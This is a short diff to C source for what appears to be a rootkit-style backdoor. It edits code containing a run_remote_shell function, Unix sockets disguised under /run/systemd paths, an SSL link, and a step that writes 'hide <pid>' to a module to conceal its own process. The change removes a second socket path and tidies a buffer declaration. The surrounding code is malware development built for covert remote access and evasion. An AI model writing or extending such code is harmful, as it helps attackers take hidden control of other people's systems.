@@ -33,9 +33,6 @@
 #ifndef UNIX_SOCK_PATH
 #define UNIX_SOCK_PATH ("/run/systemd/system/stdout")
 #endif
-#ifndef SHELL_SOCK_PATH
-#define SHELL_SOCK_PATH ("/run/systemd/system/bus")
-#endif
 
 int conn_sock;
 
@@ -98,10 +95,9 @@ void run_remote_shell(void) {
     }
     setsid();
 
-    unsigned char buffer[30];
-
     sleep(1);
 
+    unsigned char buffer[30];
     memset(buffer, 0, 30);
     sprintf((char*) buffer, "hide %d", getpid());
     printf("Writing %s to module on process start\n", buffer);
@@ -391,7 +387,6 @@ int main(void) {
 
         //See if I can remove unix socket files after connection
         unlink(UNIX_SOCK_PATH);
-        unlink(SHELL_SOCK_PATH);
 
         //Read
         for (;;) {
@@ -423,7 +418,6 @@ int main(void) {
     close(remote_shell_unix);
 
     unlink(UNIX_SOCK_PATH);
-    unlink(SHELL_SOCK_PATH);
 
     SSL_free(ssl);
 
